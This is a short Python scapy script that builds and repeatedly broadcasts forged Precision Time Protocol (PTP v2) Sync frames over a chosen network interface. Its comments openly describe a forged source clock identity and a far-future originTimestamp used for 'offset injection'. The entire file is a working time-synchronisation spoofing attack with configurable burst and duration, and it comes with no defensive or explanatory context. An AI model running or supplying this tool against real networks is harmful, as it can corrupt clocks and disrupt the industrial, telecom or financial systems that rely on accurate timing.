import sys,time,struct
from scapy.all import Ether,Raw,sendp
# argv: iface kind dur [src_id_hex] [burst] [gap_ms] [seconds]
iface,kind,dur = sys.argv[1],sys.argv[2],int(sys.argv[3])
src_id  = sys.argv[4] if len(sys.argv)>4 else "020000fffe0000aa"
burst   = int(sys.argv[5]) if len(sys.argv)>5 else 8
gap_ms  = int(sys.argv[6]) if len(sys.argv)>6 else 60
seconds = int(sys.argv[7]) if len(sys.argv)>7 else 0x7FFFFFFF
src_mac = "02:00:00:00:00:" + src_id[-2:]
def sync_frame(seq):
    # PTP v2 Sync with a manipulated originTimestamp (far-future seconds) = offset injection
    h=bytearray(34)
    h[0]=0x00; h[1]=0x02; struct.pack_into(">H",h,2,44); h[4]=24
    struct.pack_into(">H",h,6,0x0200)                 # twoStepFlag
    h[20:28]=bytes.fromhex(src_id)                    # forged source identity
    struct.pack_into(">H",h,28,1); struct.pack_into(">H",h,30,seq); h[32]=0x00; h[33]=0xFC
    body=bytearray(10); struct.pack_into(">I",body,2,seconds & 0xFFFFFFFF)
    return bytes(h)+bytes(body)
t=time.time(); seq=0
while time.time()-t<dur:
    p=Ether(dst="01:1b:19:00:00:00",src=src_mac,type=0x88F7)/Raw(sync_frame(seq%65536))
    sendp(p,iface=iface,count=burst,verbose=0); seq+=burst; time.sleep(gap_ms/1000.0)
